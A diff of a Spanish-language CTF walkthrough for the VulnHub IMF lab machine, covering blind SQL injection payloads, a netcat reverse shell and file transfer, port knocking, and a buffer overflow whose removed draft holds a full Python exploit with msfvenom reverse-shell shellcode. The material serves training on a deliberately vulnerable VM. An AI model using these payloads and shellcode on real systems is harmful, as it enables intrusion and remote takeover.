@@ -309,7 +309,6 @@ home' AND '1'='1'--
 home' AND '1'='0'--
 ```
 ![[Pasted image 20251102010623.png]]
-
 Con esto en cuenta podemos ver claramente dos respuestas distintas, confirmando la vulnerabilidad **Boolean Blind SQLi**.
 
 ### 3.4 Extracción Manual de Información
@@ -498,8 +497,6 @@ Con RCE confirmado, procedemos a obtener una reverse shell interactiva.
 ```bash
 # En la máquina atacante (Kali)
 nc -lvnp 443
-# O usar socat para mejor TTY
-socat FILE:`tty`,raw,echo=0 TCP-LISTEN:443
 ```
 
 **Paso 2: Enviar payload de reverse shell**
@@ -567,9 +564,9 @@ find / -perm -4000 2>/dev/null
 netstat -tuln
 ```
 
-En el resultado del `ps aux` se puede observar que, aparte de los procesos estándar de sistema, existe el proceso `/usr/sbin/knockd` corriendo como root. Esto es muy relevante porque **knockd es un demonio especialmente usado para port knocking**, una técnica que sirve para proteger servicios sensibles permitiendo la apertura de puertos solo tras recibir una secuencia correcta de "golpes" en puertos definidos.
-
+En el resultado del `ps aux` se puede observar que, aparte de los procesos estándar de sistema, existe el proceso `/usr/sbin/knockd` corriendo como root. 
 ![[Pasted image 20251123051345.png]]
+Esto es muy relevante porque **knockd es un demonio especialmente usado para port knocking**, una técnica que sirve para proteger servicios sensibles permitiendo la apertura de puertos solo tras recibir una secuencia correcta de "golpes" en puertos definidos.
 
 > Confirmar la presencia de knockd deja muy claro que en este reto debes realizar **port knocking** para poder acceder a algún servicio protegido.  Esta observación es clave para el progreso en la máquina, porque si no ejecutas correctamente la secuencia de knocking, el puerto se mantiene cerrado.
 
@@ -618,17 +615,17 @@ El binario nos presentará opciones. Seleccionamos opción 3 para explotar el bu
 
 ### 6.5 Traer el equipo a la maquina
 
-ATACANTE
-```
-sudo nc -nlvp 443 > agent
-```
+Necesitamos trabajar con el binario en nuestra máquina atacante para analizarlo mejor. Podemos apoyarnos de le herramienta netcat para esto:
 
-VICTIMA 
+**En la máquina víctima (con shell):**
 ```
 nc 172.16.23.1 443 < agent
 ```
 
-Vamos a traernos el binario a nuestro PC para trabajar más cómodamente con el 
+**En la máquina atacante **
+```
+sudo nc -nlvp 443 > agent
+```
 
 ![[Pasted image 20251123064856.png]]
 De esta forma, podemos usar trabajar con todos nuestros juguetes con el binario, sin necesidad de depender de los paquetes que tenga la máquina victima.
@@ -636,178 +633,145 @@ De esta forma, podemos usar trabajar con todos nuestros juguetes con el binario,
 ---
 ## 7. Explotación Buffer Overflow
 
-> [!warning] SECCIÓN MEJORADA - Rigor Técnico Añadido
-> Las siguientes subsecciones (7.1 a 7.4) incluyen explicaciones detalladas sobre el cálculo del offset y la obtención de la dirección de retorno. Se han añadido conceptos técnicos profundos basados en análisis binario.
+> [!warning] SECCIÓN TÉCNICA AVANZADA
+> Las siguientes subsecciones incluyen explicaciones detalladas sobre cálculo de offsets, direcciones de memoria y obtención de direcciones de retorno. Se requiere conocimiento básico de arquitectura x86 y análisis de binarios.
 
 ### 7.1 Concepto Fundamental: Buffer Overflow
 
-Un **Buffer Overflow** ocurre cuando un programa escribe más datos en un buffer de lo que puede almacenar. Esto causa que los datos adicionales sobrescriban la memoria adyacente, incluyendo potencialmente la dirección de retorno de una función en la pila.
+Un **Buffer Overflow** ocurre cuando un programa escribe más datos en un buffer de lo que puede almacenar. Los datos adicionales sobrescriben la memoria adyacente, incluyendo potencialmente la **dirección de retorno de una función** en el stack.
 
-**Estructura de la pila durante una llamada a función:**
+**Estructura del stack durante una llamada a función:**
 
 ```
-[Espacio Local del Buffer]  ← Donde escribimos datos
-[EBP - Base Pointer]        ← Puntero de la base del marco
-[RIP/EIP - Return Address]  ← Dirección de retorno (nuestro objetivo)
 [Parámetros de Función]
+[RIP/EIP - Return Address]  ← Nuestro objetivo (qué queremos sobrescribir)
+[EBP - Base Pointer]        ← Puntero de la base del marco
+[Espacio Local del Buffer]  ← Donde escribimos datos
 ```
 
-Cuando un buffer se desborda, podemos sobrescribir el RIP/EIP y hacer que apunte a código malicioso (shellcode) que queramos.
+Cuando un buffer se desborda, podemos sobrescribir el RIP/EIP y hacer que apunte a nuestro código malicioso (shellcode).
+### 7.2 Verificación de Protecciones con checksec
+Antes de explotar, verificamos las protecciones del binario:
+```bash
+checksec --file=agent
+```
 
-### 7.2 Cálculo del Offset: Explicación Detallada
+![[Pasted image 20251124042116.png]]
+**Análisis de protecciones:**
+- **NX disabled** ✓: El stack es ejecutable - nuestro shellcode funcionará
+- **No PIE** ✓: Las direcciones NO cambian entre ejecuciones - direcciones hardcoded funcionarán
+- **No canary** ✓: Sin protección de stack canary contra BOF
+- **Partial RELRO**: Protege parcialmente GOT/PLT (no afecta el BOF clásico)
 
-El **offset** es la cantidad exacta de bytes que debemos escribir antes de sobreescribir la dirección de retorno. Encontrarlo requiere:
-#### Paso 1: Generar un Patrón Único
+**Conclusión**: El binario es vulnerable al buffer overflow clásico sin protecciones.
 
-Podemos generar un patrón único con `gdb`, `gef` (GDB Enhanced Features) o `python`, de esta forma tendremos una cadena no repetitiva que nos permitirá identificar exactamente dónde está la dirección de retorno:
+Para análisis más detallado, instalamos GEF:
 
 ```bash
+bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
+```
 
+### 7.3 Cálculo del Offset: 
+El **offset** es la cantidad exacta de bytes que debemos escribir antes de sobreescribir la dirección de retorno. Encontrarlo requiere:
+
+Tambien tuve que instalar GEF $ "bash -c "$(curl -fsSL https://gef.blah.cat/sh)""
+#### Paso 1: Generar un Patrón Único
+
+Podemos generar un patrón único con `gdb`, `gef` (GDB Enhanced Features), metasploit o incluso `python`, de esta forma tendremos una cadena no repetitiva que nos permitirá identificar exactamente dónde está la dirección de retorno:
+
+Con GEF:
+
+```bash
+# Dentro de gdb con GEF
+gdb ./agent
+(gef) pattern create -n 4 300
+```
+
+O usando Python:
+```bash
 python3 -c "import string; print(''.join([chr((i % 26) + ord('A')) for i in range(300)]))"
 ```
 
-Incluso, una forma **más precisa** podría ser usar el script `pattern_create` de metasploit:
+O con metasploit (más preciso):
 ```bash
-pattern_create.rb -l 300
-# Yo tengo el script en: /opt/metasploit/tools/exploit/pattern_create.rb
+/opt/metasploit/tools/exploit/pattern_create.rb -l 300
 ```
 
-Este patrón tiene la propiedad de que cada subsecuencia de 4 bytes es única.
-![[Pasted image 20251123060751.png]]
+Yo usaré `gef` para el ejemplo:
+![[Pasted image 20251124060239.png]]
+Te dejo un ejemplo usado acá:
+```bash
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
+```
+La propiedad de este patrón es que **cada subsecuencia de 4 bytes es única**.
 
-#### Paso 2: Enviar el Patrón y Observar el Crash
-
-Copiamos el patrón generado y lo enviamos al binario `agent` a través de la opción 3:
+#### Paso 2: Enviar Patrón y Observar Crash
+Copiamos el patrón y lo enviamos al binario:
 
 ```bash
-./agent
+gdb ./agent
+(gef) run
 # ID: 48093572
 # Opción: 3
 # Pegamos el patrón...
 ```
-> Recuerda que es un binario X86, requieres tener los paqutees necesarios para correr binarios en caso de que tṕu máquina sea de X64. En mi caso un "sudo pacman -S lib32-glibc" fue más que suficiente.
+> **Nota**: Si es binario x86 en máquina x64, requiere: `sudo pacman -S lib32-glibc` (Arch)
 
-El programa hace crash. Revisamos el valor en el registro **EIP** (para arquitectura x86) 
-![[Pasted image 20251123060842.png]]
-#### Paso 3: Encontrar la Posición
+El programa hace crash. Revisamos el valor en el registro **EIP** (arquitecturas x86):
+![[Pasted image 20251124060447.png]]
+EIP contiene `0x62616172` que corresponde a "raab" en el patrón. Esto nos da información clave sobre cuántos caracteres necesitamos.
 
-Si el programa está corriendo bajo `gdb`:
+### Paso 3: Encontrar Offset Exacto
 
+Usamos GEF para encontrar el offset:
 ```bash
-gdb /usr/local/bin/agent
-(gdb) run
-# ... (ingresamos ID y opción 3, pegamos patrón)
-# Cuando hace crash:
-(gdb) info registers eip
-# eip            0x41376141          0x41376141   <- Estos bytes están en nuestro patrón
+pattern search 0x62616172
+#[+] Searching for '72616162'/'62616172' with period=4
+#[+] Found at offset 168 (little-endian search) likely
 ```
-
-En este caso, vemos `0x41376141` que en ASCII es "A7aA". Usamos `msf-pattern_offset` para encontrar su posición:
-
-```bash
-
- -l 300
-# Output: [*] Exact match at offset 168
-```
-
+![[Pasted image 20251124060533.png]]
 **¡El offset es exactamente 168 bytes!**
 
-**Explicación técnica:**
-- Los primeros 168 bytes llenan el buffer local
-- El byte 169 en adelante sobrescribe registros guardados (SFP - Saved Frame Pointer) en x86
-- Los bytes que siguen sobrescriben la dirección de retorno (RIP/EIP)
+Vemos también que el buffer comienza en `0xffffd614` - donde nuestro shellcode residirá inicialmente:
+`0xffffd614  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"`
+![[Pasted image 20251124062109.png]]
+Por lo tanto, si queremos sobrescribir el EIP, necesitamos exactamente **168 bytes de relleno + 4 bytes con la dirección deseada**. 
+### 7.4 Obtención de la Dirección de Retorno (0x08048563)
 
-En x86 de 32 bits:
-- Bytes 0-167: Buffer
-- Bytes 168-171: RIP/EIP (4 bytes en x86)
+Ahora sabemos que en offset 168 está el EIP. ¿Dónde colocamos nuestro shellcode? La respuesta es **apuntamos el EIP a una instrucción que ejecute nuestro código**.
 
-Por lo tanto, si queremos sobrescribir el RIP/EIP, necesitamos exactamente **168 bytes de relleno + 4 bytes con la dirección deseada**.
+Desensamblamos el binario:
+```bash
+objdump -D agent | grep -A5 "call.*eax"
+```
 
-### 7.3 Obtención de la Dirección de Retorno (0x08048563)
+![[Pasted image 20251124062956.png]]
+Encontramos una instrucción `call eax` en `0x08048563` que es perfecta porque:
+- EAX apunta al inicio de nuestro buffer (donde está el shellcode)
+- `call eax` saltará a nuestro código
 
-Ahora que sabemos que en el offset 168 está el RIP/EIP, ¿dónde colocamos nuestro shellcode? La respuesta es: **apuntamos el RIP/EIP a la dirección donde empieza nuestro shellcode**.
+**Dirección de retorno**: `0x08048563`
+### 7.5 Generación de Payload con msfvenom
 
-#### ¿De dónde sale 0x08048563?
-
-Esta dirección debe identificarse mediante:
-
-**Opción 1: Análisis Manual con GDB**
+Generamos nuestro shellcode de reverse shell:
 
 ```bash
-# Abrimos el binario en GDB
-gdb /usr/local/bin/agent
-
-# Listamos la función vulnerable
-(gdb) disassemble agent
-# O la función que maneja la entrada
-
-# Buscamos donde empieza el buffer
-(gdb) disass <nombre_funcion>
-0x08048563  <+NNN>:    lea    -0xA8(%ebp),%eax
-0x08048569  <+NNN>:    mov    %eax,0x8(%esp)
-0x0804856d  <+NNN>:    mov    0x8(%ebp),%eax
-0x08048570  <+NNN>:    mov    %eax,(%esp)
-0x08048573  <+NNN>:    call   0x8048400 <strcpy@plt>
-```
-
-La dirección `0x08048563` es la dirección donde comienza la instrucción que maneja nuestro buffer. Cuando saltamos aquí, el programa ejecuta nuestro shellcode.
-
-**Opción 2: Encontrar la Dirección del Buffer**
-
-```bash
-# El buffer generalmente está en la pila
-# Su dirección se puede encontrar con:
-
-gdb-peda$ x/20x $esp
-# Vemos direcciones de la pila
-
-# O usar checksec para ver protecciones:
-checksec /usr/local/bin/agent
-
-# Si hay ASLR (Address Space Layout Randomization):
-# Cada ejecución tiene direcciones diferentes
-# Necesitaramos una técnica de información leak o ROP gadgets
-```
-
-En este caso **sin ASLR**, la dirección del buffer es **predecible**.
-
-**Opción 3: Usar NOP Sled (Técnica de Confiabilidad)**
-
-Una técnica común es usar un **NOP sled** (secuencia de instrucciones NOP - No Operation):
-
-```
-[168 bytes de padding]
-[Dirección de retorno: 0x08048563]  ← Apunta al inicio del sled
-[100 bytes de NOPs: 0x90 x 100]    ← Se "desliza" hasta el shellcode
-[Shellcode ~72 bytes]
-```
-
-Los NOPs permiten que aunque la dirección exacta sea ligeramente imprecisa, las instrucciones simplemente no hacen nada y el procesador continúa hasta el shellcode.
-
-### 7.4 Generación de Payload con msfvenom
-
-Ahora que entendemos cómo y dónde saltamos, generamos nuestro shellcode:
-
-```bash
-# Generar shellcode reverse TCP
 msfvenom -p linux/x86/shell_reverse_tcp \
   LHOST=172.16.23.1 \
   LPORT=443 \
   -f python \
-  -b "\\x00\\x0a\\x0d"
+  -b "\x00\x0a\x0d"
 ```
 
-Parámetros explicados:
-- `-p`: Payload (shell reverso TCP)
+**Parámetros:**
+- `-p`: Tipo de payload (shell reverso TCP)
 - `LHOST`: IP donde escucharemos
 - `LPORT`: Puerto donde escucharemos
-- `-f python`: Formato de salida (código Python que podemos copiar directamente)
+- `-f python`: Formato de salida (código Python directo)
 - `-b`: Bytes a evitar (badchars):
-  - `\\x00`: Null bytes (terminan strings en C)
-  - `\\x0a`: Newline (interfiere con entrada)
-  - `\\x0d`: Carriage return (causa problemas de parsing)
-
-**Ejemplo de salida:**
+  - `\x00`: Null bytes (terminan strings en C)
+  - `\x0a`: Newline (interfiere con entrada)
+  - `\x0d`: Carriage return (problemas de parsing)
 
 ![[Pasted image 20251123042220.png]]
 
@@ -817,9 +781,12 @@ El shellcode generado es un binario compilado que:
 3. Redirige stdin/stdout/stderr al socket
 4. Ejecuta `/bin/bash`
 
-### 7.5 Estructura del Exploit
+### 7.6 Estructura del Exploit
 
-El exploit combina el shellcode, padding para alcanzar el offset, y la dirección de retorno:
+El exploit combina:
+1. Shellcode (~80 bytes)
+2. Padding para alcanzar offset (168 bytes total)
+3. Dirección de retorno (4 bytes en little-endian)
 
 **Script Python - Exploit**:
 
@@ -882,25 +849,24 @@ s.close()
 ```
 [Shellcode ~80 bytes]      ← Código que se ejecutará
 [Padding ~88 bytes]        ← Bytes de relleno (A's)
-[Ret Address 4 bytes]      ← 0x08048563 en little-endian
+[Ret Address 4 bytes]      ← 0x08048563 es la llamada a $eax en little-endian
 [Newline 1 byte]           ← Termina la entrada
 ```
 
-### 7.6 Ejecución del Exploit
+**¿Por qué little-endian?** En arquitecturas x86 de 32 bits, los valores multi-byte se almacenan en orden inverso en memoria. La dirección `0x08048563` se escribe como `\x63\x85\x04\x08`.
+### 7.7 Ejecución del Exploit
 
 **Paso 1: Port Knocking**
 
 Antes de ejecutar el exploit, debemos realizar port knocking para abrir el puerto 7788:
 
 ```bash
-knock 172.16.23.129 7482,8279,9467
+knock 172.16.23.129 7482 8279 9467
 ```
 
 Verificamos que el puerto está abierto:
-
 ```bash
 nmap -p7788 172.16.23.129
-# Puerto 7788/tcp open
 ```
 
 **Paso 2: Preparar Escucha**
@@ -917,8 +883,7 @@ nc -lvnp 443
 python3 bof.py
 ```
 
-Si todo va bien, recibimos una shell como **root** en el netcat:
-
+Si todo va bien, recibiremos una shell en el netcat:
 ```bash
 # En el netcat:
 $ id
@@ -927,162 +892,29 @@ uid=0(root) gid=0(root) groups=0(root)
 $ whoami
 root
 ```
-
+![[Pasted image 20251124070857.png]]
 **¡Tenemos acceso como root!**
 
-### 7.7 Captura de Flag Final
+Aplicamos los pasos de estabilización de TTY nuevamente si es necesario.
+
+### 7.8 Captura de Flag Final
 
 Navegamos al directorio home de root y capturamos la última flag:
 
 ```bash
 cat /root/flag6.txt
 ```
-
-Resultado: `flag6{R2gwc3RQcm90MGMwbHM=}`
+![[Pasted image 20251124071000.png]]
+**Resultado**: `flag6{R2gwc3RQcm90MGMwbHM=}`
 
 Decodificamos:
 ```bash
 echo "R2gwc3RQcm90MGMwbHM=" | base64 -d; echo
 ```
-
-**Resultado**: **Gh0stProt0c0ls** - ¡Máquina completada!
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-Generación de Payload con msfvenom
-```bash
-# Generar shellcode reverse TCP
-msfvenom -p linux/x86/shell_reverse_tcp \
-  LHOST=172.16.23.1 \
-  LPORT=443 \
-  -f python \
-  -b "\x00\x0a\x0d"
-```
-
-Flags explicadas:
-- `-p`: Payload (shell reverso TCP)
-- `LHOST`: IP donde escucharemos
-- `LPORT`: Puerto donde escucharemos
-- `-f python`: Formato de salida (código Python)
-EJEMPLO:
-![[Pasted image 20251123042220.png]]
-
-### 7.2 Estructura del Exploit
-
-El exploit combina el shellcode, padding para alcanzar el offset, y la dirección de retorno que apunta al shellcode.
-
-**Script Python - Exploit**:
-
-```python
-#!/usr/bin/python3
-
-import socket
-offset = 168
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
-
-# PAYLOAD: msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.23.1 LPORT=443 -f python -b "\x00\x0a\x0d"
-buf =  b""
-buf += b"\xdb\xda\xbb\x14\x85\x1c\x15\xd9\x74\x24\xf4\x5e"
-buf += b"\x2b\xc9\xb1\x12\x83\xee\xfc\x31\x5e\x13\x03\x4a"
-buf += b"\x96\xfe\xe0\x43\x43\x09\xe9\xf0\x30\xa5\x84\xf4"
-buf += b"\x3f\xa8\xe9\x9e\xf2\xab\x99\x07\xbd\x93\x50\x37"
-buf += b"\xf4\x92\x93\x5f\xab\x75\x73\x9e\xdb\x77\x7b\xa1"
-buf += b"\xa0\xf1\x9a\x11\xb0\x51\x0c\x02\x8e\x51\x27\x45"
-buf += b"\x3d\xd5\x65\xed\xd0\xf9\xfa\x85\x44\x29\xd2\x37"
-buf += b"\xfc\xbc\xcf\xe5\xad\x37\xee\xb9\x59\x85\x71"
-
-#padding
-buf += b"A"*(offset-len(buf))
-buf += b"\x63\x85\x04\x08\n"
-
-
-s.connect(('172.16.23.129', 7788))
-
-s.send(b"48093572\n")
-data = s.recv(1024)
-s.send(b"3\n")
-data = s.recv(1024)
-s.send(buf)
-```
-
-**Ejecución**:
-
-En la máquina atacante preparamos escucha:
-```bash
-nc -lvnp 443
-```
-
-Ejecutamos el exploit:
-```bash
-python3 bof.py
-```
-
-Si todo va bien, recibimos una shell como **root**:
-
-```bash
-$ id
-uid=0(root) gid=0(root) groups=0(root)
-```
-
-### 7.3 Captura de Flag Final
-
-Navegamos al directorio home de root y capturamos la última flag:
-
-```bash
-cat /root/flag6.txt
-```
-
-Resultado: `flag6{R2gwc3RQcm90MGMwbHM=}`
-
-Decodificamos:
-```bash
-echo "R2gwc3RQcm90MGMwbHM=" | base64 -d; echo
-```
-
+![[Pasted image 20251124071015.png]]
 **Resultado**: **Gh0stProt0c0ls** - ¡Máquina completada!
 
 ---
-
 ## Resumen de Flags Capturadas
 
 | Flag       | Contenido          | Ubicación                             | Técnica                      |
@@ -1095,132 +927,58 @@ echo "R2gwc3RQcm90MGMwbHM=" | base64 -d; echo
 | **Flag 6** | `Gh0stProt0c0ls`   | /root/flag6.txt                       | Buffer Overflow + Escalada   |
 
 ---
+exiones Finales y Lecciones Aprendidas
 
-## Reflexiones Finales
+> [!abstract] Lecciones Clave del CTF
+>
+> Este reto de VulnHub IMF demostró la importancia de:
+>
+> 1. **Reconocimiento Exhaustivo**: Nunca subestimes el análisis de código fuente, comentarios HTML y metadatos. Las banderas frecuentemente contienen pistas valiosas.
+>
+> 2. **Atención al Detalle**: Cada flag fue un paso hacia la siguiente fase. El CTF está diseñado como una cadena lógica donde cada descubrimiento te acerca más.
+>
+> 3. **Metodología Sistemática**: Desde enumeración básica con nmap, hasta explotación avanzada con análisis binario. Cada paso se construye sobre el anterior.
+>
+> 4. **Persistencia y Paciencia**: Algunos vectores requerían múltiples intentos, fuzzing extenso y pensamiento creativo (como el bypass del WAF).
+>
+> 5. **Automatización Estratégica**: Mientras que la comprensión manual es valiosa, la automatización (script Python para SQLi) es esencial para escalar en el tiempo.
+>
+> 6. **Profundidad Técnica**: Desde vulnerabilidades web aplicadas hasta análisis de binarios de bajo nivel, el pentesting requiere conocimiento en múltiples capas.
 
-> [!abstract] Lecciones Aprendidas
-> 
-> Este CTF demostró la importancia de:
-> 1. **Reconocimiento exhaustivo**: Analizar código fuente, comentarios y metadatos
-> 2. **Atencion al detalle**: Las flags eran pistas que guiaban el camino
-> 3. **Metodología sistemática**: Desde enumeración básica hasta explotación avanzada
-> 4. **Persistencia**: Algunos vectores requerían múltiples intentos y pivoting
-
-## Referencias
-
-- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
-- [Buffer Overflow Exploitation](https://owasp.org/www-community/attacks/Buffer_Overflow)
-- [VulnHub IMF Machine](https://www.vulnhub.com/entry/imf-1,162/)
-- [Nmap Official Documentation](https://nmap.org/book/)
-- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)
-- [msfvenom Documentation](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
-- [GDB Debugger Guide](https://www.gnu.org/software/gdb/documentation/)
-
-
-
-
-
-
---- 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-NOTAS (BORRADO)
-
-
-ecnontramos agent gracias a la pista de flag
-
-hay un binario,
-
-aplicamos ltrace para ver recorrido,
-
-comparamos
-
-buffer over flow
-
-mvfvenom para crear payload
-
-script de python con socket
-
-
-
-
-TUVE QUE HACER UN KNOCK qY EJECUTAR EL ARCHIVO DIRECTAMENTE EN MI PC
-
-flag6{R2gwc3RQcm90MGMwbHM=}
-
-
-```python
-#!/usr/bin/python3
-
-import socket
-
-offset = 168  
-
-# msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.23.1 LPORT=443 -f python -b "\x00\x0a\x0d"
-buf =  b""
-buf += b"\xdb\xda\xbb\x14\x85\x1c\x15\xd9\x74\x24\xf4\x5e"
-buf += b"\x2b\xc9\xb1\x12\x83\xee\xfc\x31\x5e\x13\x03\x4a"
-buf += b"\x96\xfe\xe0\x43\x43\x09\xe9\xf0\x30\xa5\x84\xf4"
-buf += b"\x3f\xa8\xe9\x9e\xf2\xab\x99\x07\xbd\x93\x50\x37"
-buf += b"\xf4\x92\x93\x5f\xab\x75\x73\x9e\xdb\x77\x7b\xa1"
-buf += b"\xa0\xf1\x9a\x11\xb0\x51\x0c\x02\x8e\x51\x27\x45"
-buf += b"\x3d\xd5\x65\xed\xd0\xf9\xfa\x85\x44\x29\xd2\x37"
-buf += b"\xfc\xbc\xcf\xe5\xad\x37\xee\xb9\x59\x85\x71"
-
-#padding
-buf += b"A"*(offset-len(buf))
-buf += b"\x63\x85\x04\x08\n"
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('172.16.23.129', 7788))
-
-s.send(b"48093572\n")
-data = s.recv(1024)
-s.send(b"3\n")
-data = s.recv(1024)
-s.send(buf)
-```
 ---
 
+## Referencias y Recursos Adicionales
 
-## Resumen de Flags Capturadas
-
-| Flag       | Contenido          | Ubicación                   | Técnica                 |
-| ---------- | ------------------ | --------------------------- | ----------------------- |
-| **Flag 1** | `allthefiles`      | contact.php - Código Fuente | Análisis manual         |
-| **Flag 2** | `imfadministrator` | index.php - Código Fuente   | Decodificación Base64   |
-| **Flag 3** | `continueTOcms`    | IMF CMS                     | Enumeración de usuarios |
-| **Flag 4** | `uploadr942.php`   | QR code en CMS              | Decodificación QR       |
-| **Flag 5** | `agentservices`    | Shell web                   | SQLi + Web shell        |
-| **Flag 6** | `Gh0stProt0c0ls`   | /root/flag6.txt             | Buffer Overflow         |
-## Referencias
-
+### Documentación Oficial
 - [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
-- [Buffer Overflow Exploitation](https://owasp.org/www-community/attacks/Buffer_Overflow)
-- [VulnHub IMF Machine](https://www.vulnhub.com/entry/imf-1,162/)
-- [Nmap Official Documentation](https://nmap.org/book/)
-- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)
+- [OWASP Buffer Overflow](https://owasp.org/www-community/attacks/Buffer_Overflow)
+- [OWASP Web Application Firewall (WAF)](https://owasp.org/www-community/attacks/Web_Application_Firewall)
 
+### Máquinas y Plataformas
+- [VulnHub - IMF Machine](https://www.vulnhub.com/entry/imf-1,162/)
+- [OverTheWire - Wargames](https://overthewire.org/wargames/)
+- [HackTheBox - Máquinas](https://www.hackthebox.com/)
+
+### Herramientas y Documentación
+- [Nmap - Official Documentation](https://nmap.org/book/)
+- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)
+- [msfvenom - Metasploit Payload Generator](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
+- [GDB Debugger Guide](https://www.gnu.org/software/gdb/documentation/)
+- [GEF - GDB Enhanced Features](https://github.com/hugsy/gef)
+
+### Libros Recomendados
+- "The Web Application Hacker's Handbook" - Stuttard & Pinto
+- "Hacking: The Art of Exploitation" - Jon Erickson
+- "Gray Hat Python" - Justin Seitz
+
+### Comunidades
+- [OWASP](https://owasp.org/)
+- [HackerOne](https://www.hackerone.com/)
+- [Bugcrowd](https://www.bugcrowd.com/)
+- [VulnHub Community](https://www.vulnhub.com/)
+
+---
+**Última Actualización**: Noviembre 24, 2025  
+**Autor**: NeTenebrae  
+**GitHub**: [github.com/NeTenebraes](https://github.com/NeTenebraes)  
+**WikiPersonal**: [NeCyberWiki](https://github.com/NeTenebraes/NeCyberWiki)
